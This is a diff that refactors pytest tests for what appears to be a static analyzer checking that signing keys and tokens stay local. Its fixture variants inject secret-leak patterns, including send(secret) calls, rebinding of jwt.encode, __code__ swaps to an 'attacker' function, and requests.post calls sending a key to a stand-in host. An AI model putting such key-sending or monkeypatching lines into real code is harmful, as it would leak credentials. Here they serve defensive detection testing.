@@ -3136,69 +3136,8 @@ def test_signing_authority_role_requires_exact_key_flow_and_closed_result(
     import hashlib
     from factoryline import mock_fixture_provenance as fixture
 
-    sources = {
-        "codec.py": "import jwt\nclass Envelope:\n    def encode(self, secret):\n        return jwt.encode({}, key=secret, algorithm='HS256')\n    @classmethod\n    def decode(cls, token, secret):\n        return jwt.decode(token, key=secret, algorithms=['HS256'])\n",
-        "test_flow.py": "import jwt\nfrom codec import Envelope\ndef test_key():\n    secret = 'local-signing-material'\n    token = jwt.encode({}, key=secret, algorithm='HS256')\n    decoded = jwt.decode(token, key=secret, algorithms=['HS256'])\n    assert decoded == {}\n",
-    }
-    if variant in {
-        "wrapper",
-        "wrapper_leak",
-        "wrapper_rebound",
-        "wrapper_returns_input",
-    }:
-        sources["test_flow.py"] = (
-            sources["test_flow.py"]
-            .replace(
-                "    token = jwt.encode({}, key=secret, algorithm='HS256')",
-                "    envelope = Envelope()\n    token = envelope.encode(secret=secret)",
-            )
-            .replace(
-                "jwt.decode(token, key=secret, algorithms=['HS256'])",
-                "Envelope.decode(token, secret=secret)",
-            )
-        )
-    if variant == "escape":
-        sources["test_flow.py"] += "    send_elsewhere(secret)\n"
-    elif variant == "result_escape":
-        sources["test_flow.py"] += "    send_elsewhere(token)\n"
-    elif variant == "key_not_key":
-        sources["test_flow.py"] = sources["test_flow.py"].replace(
-            "jwt.encode({}, key=secret", "jwt.encode(secret, key='different'"
-        )
-    elif variant == "provider_write":
-        sources["mutator.py"] = "import jwt\njwt.encode = send_elsewhere\n"
-        sources["test_flow.py"] = "import mutator\n" + sources["test_flow.py"]
-    elif variant in {"backend_provider_write", "namespace_write", "namespace_escape"}:
-        expression = {
-            "backend_provider_write": "jwt.api_jws.encode = send_elsewhere",
-            "namespace_write": "jwt.__dict__['encode'] = send_elsewhere",
-            "namespace_escape": "send_elsewhere(jwt)",
-        }[variant]
-        sources["mutator.py"] = "import jwt\n" + expression + "\n"
-        sources["test_flow.py"] = "import mutator\n" + sources["test_flow.py"]
-    elif variant == "wrapper_leak":
-        sources["codec.py"] = sources["codec.py"].replace(
-            "        return jwt.encode",
-            "        send_elsewhere(secret)\n        return jwt.encode",
-        )
-    elif variant == "wrapper_rebound":
-        sources["test_flow.py"] = sources["test_flow.py"].replace(
-            "    token = envelope",
-            "    envelope.encode = send_elsewhere\n    token = envelope",
-        )
-    elif variant == "overloaded_assertion":
-        sources["test_flow.py"] += "    assert remote.password == secret\n"
-    elif variant == "unrelated_token":
-        sources["test_flow.py"] = sources["test_flow.py"].replace(
-            "jwt.decode(token,", "jwt.decode('external-token',"
-        )
-    elif variant == "wrapper_returns_input":
-        sources["codec.py"] = sources["codec.py"].replace(
-            "        return jwt.decode(token, key=secret, algorithms=['HS256'])",
-            "        data = jwt.decode(token, key=secret, algorithms=['HS256'])\n        return token",
-        )
-    elif variant == "decoded_payload_use":
-        sources["test_flow.py"] += "    inspect_claims(decoded)\n"
+    sources = _signing_authority_role_sources()
+    _apply_signing_authority_role_variant(sources, variant)
     modules, captured, inventory = {}, {}, {}
     for name, text in sources.items():
         path = tmp_path / name
@@ -3228,6 +3167,89 @@ def test_signing_authority_role_requires_exact_key_flow_and_closed_result(
     assert (evidence.get("eligible") is True) is (
         variant in {"direct", "wrapper", "decoded_payload_use"}
     ), evidence
+
+
+def _signing_authority_role_sources():
+    return {
+        "codec.py": "import jwt\nclass Envelope:\n    def encode(self, secret):\n        return jwt.encode({}, key=secret, algorithm='HS256')\n    @classmethod\n    def decode(cls, token, secret):\n        return jwt.decode(token, key=secret, algorithms=['HS256'])\n",
+        "test_flow.py": "import jwt\nfrom codec import Envelope\ndef test_key():\n    secret = 'local-signing-material'\n    token = jwt.encode({}, key=secret, algorithm='HS256')\n    decoded = jwt.decode(token, key=secret, algorithms=['HS256'])\n    assert decoded == {}\n",
+    }
+
+
+def _apply_signing_authority_role_variant(sources, variant):
+    if variant in {
+        "wrapper",
+        "wrapper_leak",
+        "wrapper_rebound",
+        "wrapper_returns_input",
+    }:
+        sources["test_flow.py"] = (
+            sources["test_flow.py"]
+            .replace(
+                "    token = jwt.encode({}, key=secret, algorithm='HS256')",
+                "    envelope = Envelope()\n    token = envelope.encode(secret=secret)",
+            )
+            .replace(
+                "jwt.decode(token, key=secret, algorithms=['HS256'])",
+                "Envelope.decode(token, secret=secret)",
+            )
+        )
+    replacements = {
+        "key_not_key": [
+            (
+                "test_flow.py",
+                "jwt.encode({}, key=secret",
+                "jwt.encode(secret, key='different'",
+            )
+        ],
+        "wrapper_rebound": [
+            (
+                "test_flow.py",
+                "    token = envelope",
+                "    envelope.encode = send_elsewhere\n    token = envelope",
+            )
+        ],
+        "unrelated_token": [
+            ("test_flow.py", "jwt.decode(token,", "jwt.decode('external-token',")
+        ],
+        "wrapper_leak": [
+            (
+                "codec.py",
+                "        return jwt.encode",
+                "        send_elsewhere(secret)\n        return jwt.encode",
+            )
+        ],
+        "wrapper_returns_input": [
+            (
+                "codec.py",
+                "        return jwt.decode(token, key=secret, algorithms=['HS256'])",
+                "        data = jwt.decode(token, key=secret, algorithms=['HS256'])\n        return token",
+            )
+        ],
+    }
+    for name, before, after in replacements.get(variant, []):
+        sources[name] = sources[name].replace(before, after)
+    additions = {
+        "escape": ("test_flow.py", "    send_elsewhere(secret)\n"),
+        "result_escape": ("test_flow.py", "    send_elsewhere(token)\n"),
+        "overloaded_assertion": (
+            "test_flow.py",
+            "    assert remote.password == secret\n",
+        ),
+        "decoded_payload_use": ("test_flow.py", "    inspect_claims(decoded)\n"),
+    }
+    if variant in additions:
+        name, addition = additions[variant]
+        sources[name] += addition
+    mutators = {
+        "provider_write": "jwt.encode = send_elsewhere",
+        "backend_provider_write": "jwt.api_jws.encode = send_elsewhere",
+        "namespace_write": "jwt.__dict__['encode'] = send_elsewhere",
+        "namespace_escape": "send_elsewhere(jwt)",
+    }
+    if variant in mutators:
+        sources["mutator.py"] = "import jwt\n" + mutators[variant] + "\n"
+        sources["test_flow.py"] = "import mutator\n" + sources["test_flow.py"]
 
 
 _CLASS_SIGNING264 = """import jwt
@@ -3594,80 +3616,7 @@ def test_request273_typing_provider_reads_do_not_forgive_mutation(tmp_path, vari
     ],
 )
 def test_object_signing265_constructor_field_native(tmp_path, variant):
-    text = _OBJECT_SIGNING265
-    extras = {
-        "key_export": "        send(self.signing_secret)\n",
-        "owner_export": "        send(self)\n",
-        "gate_export": "        send(gate)\n",
-        "provider_write": "SignatureVerifier.generate_signature = send\n",
-        "signature_export": "        requests.post('https://api.example', headers={'X-Slack-Signature': signature})\n",
-        "unused_signature": "        unused = self.signer.generate_signature(body='body', timestamp='timestamp')\n",
-    }
-    text += extras.get(variant, "")
-    if variant == "raw_field_export":
-        text = text.replace(
-            "        return verifier.is_valid",
-            "        send(self._key)\n        return verifier.is_valid",
-        )
-    elif variant == "constructor_escape":
-        text = text.replace(
-            "        self._key = key", "        self._key = key\n        send(self)"
-        )
-    elif variant == "no_signer_use":
-        text = text.replace(
-            "self.signer.generate_signature(body='body', timestamp='timestamp')",
-            "'signature'",
-        )
-    elif variant == "other_key":
-        text = text.replace(
-            "SignatureVerifier(signing_secret)", "SignatureVerifier('different-key')"
-        )
-    elif variant == "verifier_export":
-        text = text.replace(
-            "        return verifier.is_valid",
-            "        send(verifier)\n        return verifier.is_valid",
-        )
-    elif variant == "verifier_transmit":
-        text = text.replace(
-            "        return verifier.is_valid",
-            "        requests.post('https://api.example', headers={'X-Slack-Signature': verifier.generate_signature(body='body', timestamp='timestamp')})\n        return verifier.is_valid",
-        )
-    elif variant == "returned_verifier":
-        text = text.replace(
-            "return verifier.is_valid('body', 'timestamp', signature)",
-            "return verifier",
-        ).replace("assert gate.check(signature)", "send(gate.check(signature))")
-    elif variant == "unrelated_signature":
-        text = text.replace(
-            "assert gate.check(signature)", "assert gate.check('external-signature')"
-        )
-    elif variant == "unused_verifier":
-        text = text.replace("        assert gate.check(signature)\n", "")
-    elif variant == "signature_formal_export":
-        text = text.replace(
-            "        return verifier.is_valid",
-            "        send(signature)\n        return verifier.is_valid",
-        )
-    elif variant == "verifier_alias":
-        text = text.replace(
-            "        return verifier.is_valid",
-            "        alias = verifier\n        return verifier.is_valid",
-        )
-    elif variant == "hidden_verifier_export":
-        text = text.replace(
-            "class TestSigning:",
-            "    def unused(self):\n        verifier = SignatureVerifier(self._key)\n        send(verifier)\nclass TestSigning:",
-        )
-    elif variant == "constructor_method_export":
-        text = text.replace(
-            "        self._key = key",
-            "        self._key = key\n        register(self.check)",
-        )
-    elif variant == "verification_method_export":
-        text = text.replace(
-            "        verifier = SignatureVerifier(self._key)",
-            "        register(self.check)\n        verifier = SignatureVerifier(self._key)",
-        )
+    text = _object_signing265_constructor_variant(variant)
     _write(tmp_path, "test_signing.py", text)
     declaration_line = next(
         node.lineno
@@ -3699,6 +3648,94 @@ def test_object_signing265_constructor_field_native(tmp_path, variant):
             )
 
 
+def _object_signing265_constructor_variant(variant):
+    extras = {
+        "key_export": "        send(self.signing_secret)\n",
+        "owner_export": "        send(self)\n",
+        "gate_export": "        send(gate)\n",
+        "provider_write": "SignatureVerifier.generate_signature = send\n",
+        "signature_export": "        requests.post('https://api.example', headers={'X-Slack-Signature': signature})\n",
+        "unused_signature": "        unused = self.signer.generate_signature(body='body', timestamp='timestamp')\n",
+    }
+    replacements = {
+        "raw_field_export": [
+            (
+                "        return verifier.is_valid",
+                "        send(self._key)\n        return verifier.is_valid",
+            )
+        ],
+        "constructor_escape": [
+            ("        self._key = key", "        self._key = key\n        send(self)")
+        ],
+        "no_signer_use": [
+            (
+                "self.signer.generate_signature(body='body', timestamp='timestamp')",
+                "'signature'",
+            )
+        ],
+        "other_key": [
+            ("SignatureVerifier(signing_secret)", "SignatureVerifier('different-key')")
+        ],
+        "verifier_export": [
+            (
+                "        return verifier.is_valid",
+                "        send(verifier)\n        return verifier.is_valid",
+            )
+        ],
+        "verifier_transmit": [
+            (
+                "        return verifier.is_valid",
+                "        requests.post('https://api.example', headers={'X-Slack-Signature': verifier.generate_signature(body='body', timestamp='timestamp')})\n        return verifier.is_valid",
+            )
+        ],
+        "returned_verifier": [
+            (
+                "return verifier.is_valid('body', 'timestamp', signature)",
+                "return verifier",
+            ),
+            ("assert gate.check(signature)", "send(gate.check(signature))"),
+        ],
+        "unrelated_signature": [
+            ("assert gate.check(signature)", "assert gate.check('external-signature')")
+        ],
+        "unused_verifier": [("        assert gate.check(signature)\n", "")],
+        "signature_formal_export": [
+            (
+                "        return verifier.is_valid",
+                "        send(signature)\n        return verifier.is_valid",
+            )
+        ],
+        "verifier_alias": [
+            (
+                "        return verifier.is_valid",
+                "        alias = verifier\n        return verifier.is_valid",
+            )
+        ],
+        "hidden_verifier_export": [
+            (
+                "class TestSigning:",
+                "    def unused(self):\n        verifier = SignatureVerifier(self._key)\n        send(verifier)\nclass TestSigning:",
+            )
+        ],
+        "constructor_method_export": [
+            (
+                "        self._key = key",
+                "        self._key = key\n        register(self.check)",
+            )
+        ],
+        "verification_method_export": [
+            (
+                "        verifier = SignatureVerifier(self._key)",
+                "        register(self.check)\n        verifier = SignatureVerifier(self._key)",
+            )
+        ],
+    }
+    text = _OBJECT_SIGNING265 + extras.get(variant, "")
+    for before, after in replacements.get(variant, []):
+        text = text.replace(before, after)
+    return text
+
+
 @pytest.mark.parametrize(
     "variant",
     [
@@ -3727,68 +3764,7 @@ def test_object_signing265_constructor_field_native(tmp_path, variant):
     ],
 )
 def test_object_signing266_metadata_native(tmp_path, variant):
-    helper = """import logging
-from logging import Logger
-from typing import Any, Optional
-def describe(cls: Any, logger: Optional[Logger] = None) -> Logger:
-    return logging.getLogger(f'local.{cls.__name__}')
-"""
-    text = _OBJECT_SIGNING265.replace(
-        "        self._key = key",
-        "        self._key = key\n        self.label = describe(Gate)",
-    )
-    changes = {
-        "raw_export": "    send(cls)\n",
-        "field_export": "    send(cls.authority)\n",
-        "method_export": "    register(cls.check)\n",
-        "nested_capture": "    def inner():\n        return cls.__name__\n",
-        "formal_rebind": "    cls = attacker\n",
-        "class_write": "    cls.authority = 'changed'\n",
-        "reflective_read": "    getattr(cls, 'authority')\n",
-    }
-    helper = helper.replace(
-        "    return logging.getLogger",
-        changes.get(variant, "") + "    return logging.getLogger",
-    )
-    if variant == "replacement":
-        text += "describe = send\n"
-    elif variant == "effectful_annotation":
-        helper = helper.replace("cls: Any", "cls: mutate()")
-    elif variant == "effectful_default":
-        helper = helper.replace("= None", "= mutate()")
-    elif variant == "decorated":
-        helper = helper.replace("def describe", "@transform\ndef describe")
-    elif variant == "key_export":
-        text += "        send(self.signing_secret)\n"
-    elif variant == "signature_export":
-        text += "        send(signature)\n"
-    elif variant in {"code_replacement", "aliased_code_replacement"}:
-        text += "\ndef transmit(self, signature):\n    requests.post('https://api.example', headers={'Authorization': self._key})\n    return True\ndef attacker(cls):\n    cls.check = transmit\n    return 'changed'\n"
-        text += (
-            "describe.__code__ = attacker.__code__\n"
-            if variant == "code_replacement"
-            else "replacement = describe\nreplacement.__code__ = attacker.__code__\n"
-        )
-    elif variant == "function_export":
-        text += "send(describe)\n"
-    elif variant == "nested_effectful_metadata":
-        helper = helper.replace(
-            "f'local.{cls.__name__}'",
-            "f'{leak(secret).__name__}.{cls.__name__}'",
-        )
-    elif variant == "global_metadata_receiver":
-        helper = helper.replace(
-            "f'local.{cls.__name__}'",
-            "f'{external.__name__}.{cls.__name__}'",
-        )
-    elif variant == "configured_logger_factory":
-        helper += "class ExportingLogger(logging.Logger):\n    def __init__(self, name):\n        send(TestSigning.signing_secret)\nlogging.setLoggerClass(ExportingLogger)\n"
-    elif variant == "configured_logger_manager":
-        helper += "logging.Logger.manager = external\n"
-    elif variant == "dynamic_module_metadata":
-        helper = helper.replace("cls.__name__", "cls.__module__")
-        text = text.replace("class Gate:", "class Gate:\n    __module__ = external")
-    text = helper + text
+    text = _object_signing266_metadata_variant(variant)
     _write(tmp_path, "test_signing.py", text)
     declaration_line = next(
         node.lineno
@@ -3820,6 +3796,71 @@ def describe(cls: Any, logger: Optional[Logger] = None) -> Logger:
                 and all(row["severity"] == "CRITICAL" for row in active)
                 and not observed
             ), report
+
+
+def _object_signing266_metadata_variant(variant):
+    helper = """import logging
+from logging import Logger
+from typing import Any, Optional
+def describe(cls: Any, logger: Optional[Logger] = None) -> Logger:
+    return logging.getLogger(f'local.{cls.__name__}')
+"""
+    text = _OBJECT_SIGNING265.replace(
+        "        self._key = key",
+        "        self._key = key\n        self.label = describe(Gate)",
+    )
+    changes = {
+        "raw_export": "    send(cls)\n",
+        "field_export": "    send(cls.authority)\n",
+        "method_export": "    register(cls.check)\n",
+        "nested_capture": "    def inner():\n        return cls.__name__\n",
+        "formal_rebind": "    cls = attacker\n",
+        "class_write": "    cls.authority = 'changed'\n",
+        "reflective_read": "    getattr(cls, 'authority')\n",
+    }
+    helper = helper.replace(
+        "    return logging.getLogger",
+        changes.get(variant, "") + "    return logging.getLogger",
+    )
+    helper = helper.replace(
+        "cls.__name__",
+        {"dynamic_module_metadata": "cls.__module__"}.get(variant, "cls.__name__"),
+    )
+    metadata_replacements = {
+        "effectful_annotation": [("cls: Any", "cls: mutate()")],
+        "effectful_default": [("= None", "= mutate()")],
+        "decorated": [("def describe", "@transform\ndef describe")],
+        "nested_effectful_metadata": [
+            ("f'local.{cls.__name__}'", "f'{leak(secret).__name__}.{cls.__name__}'")
+        ],
+        "global_metadata_receiver": [
+            ("f'local.{cls.__name__}'", "f'{external.__name__}.{cls.__name__}'")
+        ],
+    }
+    text_additions = {
+        "replacement": "describe = send\n",
+        "key_export": "        send(self.signing_secret)\n",
+        "signature_export": "        send(signature)\n",
+        "function_export": "send(describe)\n",
+    }
+    code_replacement = "\ndef transmit(self, signature):\n    requests.post('https://api.example', headers={'Authorization': self._key})\n    return True\ndef attacker(cls):\n    cls.check = transmit\n    return 'changed'\n"
+    text += text_additions.get(variant, "")
+    if variant in {"code_replacement", "aliased_code_replacement"}:
+        text += code_replacement
+        text += {
+            "code_replacement": "describe.__code__ = attacker.__code__\n",
+            "aliased_code_replacement": "replacement = describe\nreplacement.__code__ = attacker.__code__\n",
+        }[variant]
+    for before, after in metadata_replacements.get(variant, []):
+        helper = helper.replace(before, after)
+    helper += {
+        "configured_logger_factory": "class ExportingLogger(logging.Logger):\n    def __init__(self, name):\n        send(TestSigning.signing_secret)\nlogging.setLoggerClass(ExportingLogger)\n",
+        "configured_logger_manager": "logging.Logger.manager = external\n",
+    }.get(variant, "")
+    if variant == "dynamic_module_metadata":
+        text = text.replace("class Gate:", "class Gate:\n    __module__ = external")
+    text = helper + text
+    return text
 
 
 @pytest.mark.parametrize("kind", ["def", "async def", "class"])
@@ -3861,55 +3902,7 @@ def test_source_alias266_exact_local_definition_identity(tmp_path, kind):
     ],
 )
 def test_signing267_lazy(tmp_path, variant):
-    eager = "    def check(self, signature):\n        verifier = SignatureVerifier(self._key)\n        return verifier.is_valid('body', 'timestamp', signature)\n"
-    lazy = """    @property
-    def verifier(self):
-        if self._verifier is None:
-            self._verifier = SignatureVerifier(self._key)
-        return self._verifier
-    def check(self, signature):
-        return self.verifier.is_valid('body', 'timestamp', signature)
-"""
-    text = _OBJECT_SIGNING265.replace(eager, lazy).replace(
-        "        self._key = key",
-        "        self._key = key\n        self._verifier = None",
-    )
-    extras = {
-        "field_export": "    def escape(self):\n        send(self._verifier)\n",
-        "property_export": "    def escape(self):\n        send(self.verifier)\n",
-        "property_alias": "    def escape(self):\n        alias = self.verifier\n        send(alias)\n",
-        "property_return": "    def escape(self):\n        return self.verifier\n",
-        "field_mutation": "    def replace(self):\n        self._verifier = attacker\n",
-    }
-    text = text.replace(
-        "class TestSigning:", extras.get(variant, "") + "class TestSigning:"
-    )
-    if variant == "getter_extra":
-        text = text.replace(
-            "        return self._verifier",
-            "        send(self._verifier)\n        return self._verifier",
-        )
-    elif variant == "getter_replacement":
-        text += "Gate.verifier = attacker\n"
-    elif variant == "property_shadow":
-        text = "property = transform\n" + text
-    elif variant == "signature_export":
-        text += "        send(signature)\n"
-    elif variant == "bound_method_export":
-        text = text.replace(
-            "        self._key = key",
-            "        self._key = key\n        register(self.check)",
-        )
-    if variant == "receiver_rebind":
-        text = text.replace(
-            "        return self.verifier.is_valid",
-            "        self = other\n        return self.verifier.is_valid",
-        )
-        text += "\nclass External:\n    def is_valid(self, body, timestamp, signature):\n        send(signature)\n        return True\nclass Remote:\n    verifier = External()\nother = Remote()\n"
-    elif variant == "getter_default_effect":
-        text = text.replace("def verifier(self):", "def verifier(self=mutate()):")
-    elif variant == "getter_annotation_effect":
-        text = text.replace("def verifier(self):", "def verifier(self) -> mutate():")
+    text = _signing267_lazy_variant(variant)
     _write(tmp_path, "test_signing.py", text)
     line = next(
         node.lineno
@@ -3941,6 +3934,69 @@ def test_signing267_lazy(tmp_path, variant):
             ), report
 
 
+def _signing267_lazy_variant(variant):
+    eager = "    def check(self, signature):\n        verifier = SignatureVerifier(self._key)\n        return verifier.is_valid('body', 'timestamp', signature)\n"
+    lazy = """    @property
+    def verifier(self):
+        if self._verifier is None:
+            self._verifier = SignatureVerifier(self._key)
+        return self._verifier
+    def check(self, signature):
+        return self.verifier.is_valid('body', 'timestamp', signature)
+"""
+    text = _OBJECT_SIGNING265.replace(eager, lazy).replace(
+        "        self._key = key",
+        "        self._key = key\n        self._verifier = None",
+    )
+    extras = {
+        "field_export": "    def escape(self):\n        send(self._verifier)\n",
+        "property_export": "    def escape(self):\n        send(self.verifier)\n",
+        "property_alias": "    def escape(self):\n        alias = self.verifier\n        send(alias)\n",
+        "property_return": "    def escape(self):\n        return self.verifier\n",
+        "field_mutation": "    def replace(self):\n        self._verifier = attacker\n",
+    }
+    text = text.replace(
+        "class TestSigning:", extras.get(variant, "") + "class TestSigning:"
+    )
+    replacements = {
+        "getter_extra": [
+            (
+                "        return self._verifier",
+                "        send(self._verifier)\n        return self._verifier",
+            )
+        ],
+        "bound_method_export": [
+            (
+                "        self._key = key",
+                "        self._key = key\n        register(self.check)",
+            )
+        ],
+        "receiver_rebind": [
+            (
+                "        return self.verifier.is_valid",
+                "        self = other\n        return self.verifier.is_valid",
+            )
+        ],
+        "getter_default_effect": [
+            ("def verifier(self):", "def verifier(self=mutate()):")
+        ],
+        "getter_annotation_effect": [
+            ("def verifier(self):", "def verifier(self) -> mutate():")
+        ],
+    }
+    for before, after in replacements.get(variant, []):
+        text = text.replace(before, after)
+    text = {
+        "property_shadow": "property = transform\n" + text,
+    }.get(variant, text)
+    text += {
+        "getter_replacement": "Gate.verifier = attacker\n",
+        "signature_export": "        send(signature)\n",
+        "receiver_rebind": "\nclass External:\n    def is_valid(self, body, timestamp, signature):\n        send(signature)\n        return True\nclass Remote:\n    verifier = External()\nother = Remote()\n",
+    }.get(variant, "")
+    return text
+
+
 @pytest.mark.parametrize(
     "variant",
     [
@@ -3964,82 +4020,7 @@ def test_signing267_lazy(tmp_path, variant):
     ],
 )
 def test_signing268_helper(tmp_path, variant):
-    text = _OBJECT_SIGNING265.replace(
-        "    def test_roundtrip(self):",
-        "    def signature(self, body: str):\n        return self.signer.generate_signature(body=body, timestamp='timestamp')\n    def test_roundtrip(self):",
-    ).replace(
-        "signature = self.signer.generate_signature(body='body', timestamp='timestamp')",
-        "signature = self.signature('body')",
-    )
-    if variant == "alias":
-        text = text.replace(
-            "        return self.signer.generate_signature(body=body, timestamp='timestamp')",
-            "        token = self.signer.generate_signature(body=body, timestamp='timestamp')\n        alias = token\n        return alias",
-        )
-    elif variant == "nested":
-        text = text.replace(
-            "    def test_roundtrip(self):",
-            "    def envelope(self):\n        return self.signature('body')\n    def test_roundtrip(self):",
-        ).replace("signature = self.signature('body')", "signature = self.envelope()")
-    elif variant == "export":
-        text += "        send(signature)\n"
-    elif variant == "helper_export":
-        text = text.replace(
-            "    def test_roundtrip(self):",
-            "    def publish(self):\n        send(self.signature('body'))\n    def test_roundtrip(self):",
-        )
-    elif variant == "alias_export":
-        text = text.replace(
-            "        assert gate.check(signature)",
-            "        alias = signature\n        send(alias)\n        assert gate.check(signature)",
-        )
-    elif variant == "rebound_receiver":
-        text = text.replace(
-            "        signature = self.signature",
-            "        self = remote\n        signature = self.signature",
-        )
-    elif variant == "helper_replacement":
-        text = text.replace(
-            "        signature = self.signature",
-            "        self.signature = attacker\n        signature = self.signature",
-        )
-    elif variant == "helper_default":
-        text = text.replace("body: str):", "body: str = mutate()):")
-    elif variant == "helper_annotation":
-        text = text.replace("body: str):", "body: mutate()):")
-    elif variant == "missing_argument":
-        text = text.replace(
-            "signature = self.signature('body')", "signature = self.signature()"
-        )
-    elif variant == "unused":
-        text = text.replace("        assert gate.check(signature)\n", "")
-    elif variant == "loop":
-        text = text.replace(
-            "    def test_roundtrip(self):",
-            "    def recurse(self):\n        return self.recurse() or self.signature('body')\n    def test_roundtrip(self):",
-        ).replace("signature = self.signature('body')", "signature = self.recurse()")
-    elif variant == "nested_capture":
-        text = text.replace(
-            "        assert gate.check(signature)",
-            "        def escaped():\n            send(signature)\n        assert gate.check(signature)",
-        )
-    elif variant == "rebind_alias":
-        text = text.replace(
-            "        assert gate.check(signature)",
-            "        signature = other\n        assert gate.check(signature)",
-        )
-    elif variant == "before_assignment":
-        text = text.replace(
-            "        signature = self.signature('body')",
-            "        send(signature)\n        signature = self.signature('body')",
-        )
-    if variant == "same_method_name":
-        text = text.replace(
-            "def signature(self,", "def generate_signature(self,"
-        ).replace(
-            "signature = self.signature('body')",
-            "signature = self.generate_signature('body')",
-        )
+    text = _signing268_helper_variant(variant)
     _write(tmp_path, "test_signing.py", text)
     line = next(
         node.lineno
@@ -4069,6 +4050,97 @@ def test_signing268_helper(tmp_path, variant):
                 and all(row["severity"] == "CRITICAL" for row in active)
                 and not observations
             ), report
+
+
+def _signing268_helper_variant(variant):
+    text = _OBJECT_SIGNING265.replace(
+        "    def test_roundtrip(self):",
+        "    def signature(self, body: str):\n        return self.signer.generate_signature(body=body, timestamp='timestamp')\n    def test_roundtrip(self):",
+    ).replace(
+        "signature = self.signer.generate_signature(body='body', timestamp='timestamp')",
+        "signature = self.signature('body')",
+    )
+    replacements = {
+        "alias": [
+            (
+                "        return self.signer.generate_signature(body=body, timestamp='timestamp')",
+                "        token = self.signer.generate_signature(body=body, timestamp='timestamp')\n        alias = token\n        return alias",
+            )
+        ],
+        "nested": [
+            (
+                "    def test_roundtrip(self):",
+                "    def envelope(self):\n        return self.signature('body')\n    def test_roundtrip(self):",
+            ),
+            ("signature = self.signature('body')", "signature = self.envelope()"),
+        ],
+        "alias_export": [
+            (
+                "        assert gate.check(signature)",
+                "        alias = signature\n        send(alias)\n        assert gate.check(signature)",
+            )
+        ],
+        "helper_export": [
+            (
+                "    def test_roundtrip(self):",
+                "    def publish(self):\n        send(self.signature('body'))\n    def test_roundtrip(self):",
+            )
+        ],
+        "rebound_receiver": [
+            (
+                "        signature = self.signature",
+                "        self = remote\n        signature = self.signature",
+            )
+        ],
+        "helper_replacement": [
+            (
+                "        signature = self.signature",
+                "        self.signature = attacker\n        signature = self.signature",
+            )
+        ],
+        "helper_default": [("body: str):", "body: str = mutate()):")],
+        "helper_annotation": [("body: str):", "body: mutate()):")],
+        "missing_argument": [
+            ("signature = self.signature('body')", "signature = self.signature()")
+        ],
+        "unused": [("        assert gate.check(signature)\n", "")],
+        "loop": [
+            (
+                "    def test_roundtrip(self):",
+                "    def recurse(self):\n        return self.recurse() or self.signature('body')\n    def test_roundtrip(self):",
+            ),
+            ("signature = self.signature('body')", "signature = self.recurse()"),
+        ],
+        "nested_capture": [
+            (
+                "        assert gate.check(signature)",
+                "        def escaped():\n            send(signature)\n        assert gate.check(signature)",
+            )
+        ],
+        "rebind_alias": [
+            (
+                "        assert gate.check(signature)",
+                "        signature = other\n        assert gate.check(signature)",
+            )
+        ],
+        "before_assignment": [
+            (
+                "        signature = self.signature('body')",
+                "        send(signature)\n        signature = self.signature('body')",
+            )
+        ],
+        "same_method_name": [
+            ("def signature(self,", "def generate_signature(self,"),
+            (
+                "signature = self.signature('body')",
+                "signature = self.generate_signature('body')",
+            ),
+        ],
+    }
+    for before, after in replacements.get(variant, []):
+        text = text.replace(before, after)
+    text += {"export": "        send(signature)\n"}.get(variant, "")
+    return text
 
 
 def _identity_transfer_capture(tmp_path, files):
